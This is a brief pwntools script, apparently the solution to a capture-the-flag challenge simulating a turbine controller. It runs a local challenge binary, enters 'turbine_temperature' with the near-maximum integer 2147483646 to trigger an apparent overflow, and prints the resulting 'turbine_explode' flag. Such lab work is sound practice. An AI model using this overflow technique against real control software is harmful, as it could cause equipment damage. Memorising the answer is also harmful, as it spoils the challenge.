#!/usr/bin/python3

from pwn import *
import os
import warnings

warnings.filterwarnings("ignore", category=BytesWarning)
context.log_level = 'error'

env = os.environ.copy()
env['LD_LIBRARY_PATH'] = './runner/external/'

pid = process(['./runner/run.sh'], env=env)
pid.recv(numb=100, timeout=1.0)

pid.sendline(b'turbine_temperature')
pid.recv(timeout=1.0)
pid.sendline(b'2147483646')


print(text.red("[+]") + " FLAG turbine_explode:")
print(pid.clean().decode(errors='ignore').split("\n")[1])
print()